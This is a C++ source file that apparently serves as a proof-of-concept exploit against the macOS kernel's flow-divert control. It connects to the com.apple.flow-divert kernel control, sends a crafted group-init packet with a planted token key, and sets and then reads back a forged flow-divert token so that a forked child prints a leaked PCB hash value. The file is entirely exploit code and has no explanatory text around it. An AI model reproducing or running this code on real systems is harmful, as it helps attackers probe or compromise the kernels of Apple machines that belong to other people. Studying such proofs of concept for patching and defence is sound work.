// clang++ -std=c++11 -o main main.c

#include <stdio.h>
#include <thread>
#include <netinet/in.h>
#include <net/if.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <pthread/qos.h>
#include <sys/socket.h>
#include <pthread/pthread.h>
#include <sys/errno.h>
#include <sys/kern_control.h>
#include <sys/sys_domain.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <sys/ioctl.h>

extern int *__error();
#define error (*__error())

#define IPPROTO_TCP 6
#define FLOW_DIVERT_TLV_CTL_UNIT 10
#define FLOW_DIVERT_TLV_AGGREGATE_UNIT 26
#define SO_FLOW_DIVERT_TOKEN 0x1106
#define FLOW_DIVERT_TLV_SIGNING_ID 25

struct control {
  char     Type;
  uint32_t Length;
  uint32_t Unit;
}__attribute__((packed));

struct aggregate {
  char     Type;
  uint32_t Length;
  uint32_t Unit;
}__attribute__((packed));

struct signing_id {
    uint8_t  Type;
    uint32_t Length;
    uint32_t ID;
}__attribute__((packed));

struct flow_divert_create_packet {
  struct control control_unit;
  struct aggregate aggregate_unit;
  struct signing_id signing;
}__attribute__((packed));

int sock_fd[4];
uint32_t pcb_hash;
char *pause_mem = NULL;
void do_token() {
    sock_fd[0] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock_fd[0] < 0) {
        perror("[do_token:socket]");
        exit(EXIT_FAILURE);
    }
    
    struct flow_divert_create_packet packet {
        .control_unit = {
            .Type   = FLOW_DIVERT_TLV_CTL_UNIT,
            .Length = htonl(4),
            .Unit   = htonl(0x0FFFFFFF),
        },
        .aggregate_unit = {
            .Type   = FLOW_DIVERT_TLV_AGGREGATE_UNIT,
            .Length = htonl(4),
            .Unit   = htonl(0),
        },
        .signing = {
            .Type   = FLOW_DIVERT_TLV_SIGNING_ID,
            .Length = htonl(4),
            .ID     = htonl(0),
        },
    };
    setsockopt(sock_fd[0], SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, &packet, sizeof(packet));
    char to_BUF[0x40] = {0};
    socklen_t Length = 0x40;
    if(!fork()) {
        printf("Child PID:%d\n",getpid());
        listen(sock_fd[0],5); // update so->lastpid
        getsockopt(sock_fd[0], SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, to_BUF, &Length);
        pcb_hash = *(uint32_t*)(to_BUF + 14);
        printf("PCB_HASH_VAL:\t\t%#x\n",pcb_hash);
    }

}

#define CTL_SIZE sizeof(struct sockaddr_ctl)
#define CTL_INFOSZ sizeof(struct ctl_info)
#define CONTROL_NAME "com.apple.flow-divert"

int sock_kctl[32];
void connect_kctl(int index) {
    sock_kctl[index] = socket(AF_SYSTEM,SOCK_DGRAM,SYSPROTO_CONTROL);
    if(sock_kctl[index] < 0) {
        perror("[connect_kctl:socket]");
        exit(EXIT_FAILURE);
    }
    struct sockaddr_ctl target;
    target.sc_len     = CTL_SIZE;
    target.sc_family  = AF_SYSTEM;
    target.ss_sysaddr = AF_SYS_CONTROL;
    
    struct ctl_info info;
    memset(&info,0,CTL_INFOSZ);
    strlcpy(info.ctl_name,CONTROL_NAME,sizeof(info.ctl_name));
    if(ioctl(sock_kctl[index],CTLIOCGINFO,&info) == -1) {
        perror("[ioctl]");
        exit(EXIT_FAILURE);
    }
    target.sc_id      = info.ctl_id;
    target.sc_unit    = 0x0FFFFFFF;
    if (connect(sock_kctl[index], (struct sockaddr *)&target, CTL_SIZE) == -1) {
        perror("[connect_kctl:connect]");
        exit(EXIT_FAILURE);
    }

}

#define FLOW_DIVERT_PKT_GROUP_INIT 6
#define FLOW_DIVERT_TLV_TOKEN_KEY 17
struct flow_divert_packet_header {
    uint32_t             packet_type;
    uint32_t             conn_id;
}__attribute__((packed));

struct init_data {
    uint8_t  Type;
    uint32_t Length;
    char     to_BUF[4];
}__attribute__((packed));

struct result_data {
    uint8_t  Type;
    uint32_t Length;
    char     to_BUF[4];
}__attribute__((packed));

void group_init(int fd) {
    char *mem = (char*)malloc(0x200);
    bzero(mem,0x200);
    uint32_t length;
    
    struct flow_divert_packet_header *init_packet = (struct flow_divert_packet_header*)mem;
    
    init_packet->packet_type = FLOW_DIVERT_PKT_GROUP_INIT;
    init_packet->conn_id = htonl(0);
    struct init_data *key_size = (struct init_data *)(mem + sizeof(struct flow_divert_packet_header));
    key_size->Type = FLOW_DIVERT_TLV_TOKEN_KEY;
    key_size->Length = htonl(4);
    *(uint32_t*)(key_size->to_BUF) = htonl(4);
    
    
    struct init_data *token = (struct init_data *)(mem + sizeof(struct flow_divert_packet_header) + 9);
    token->Type = FLOW_DIVERT_TLV_TOKEN_KEY;
    token->Length = htonl(4);
    *(uint32_t*)(token->to_BUF) = htonl(0xDEADBEEF);
    
    length = sizeof(struct flow_divert_packet_header) + 9 + 9;
    if(send(fd,mem,length,0) < 0) {
        perror("[group_init]");
        exit(EXIT_FAILURE);
    }
}

int main() {
    printf("Parent PID:%d\n",getpid());
    connect_kctl(0); // unit = 0xFFFF
    group_init(sock_kctl[0]); // init group for kctl_connect of flow-divert
    do_token();
    
    sleep(10);
    printf("Closing Socket\n");
    close(sock_fd[0]);
    close(sock_kctl[0]);
    return 0;
}
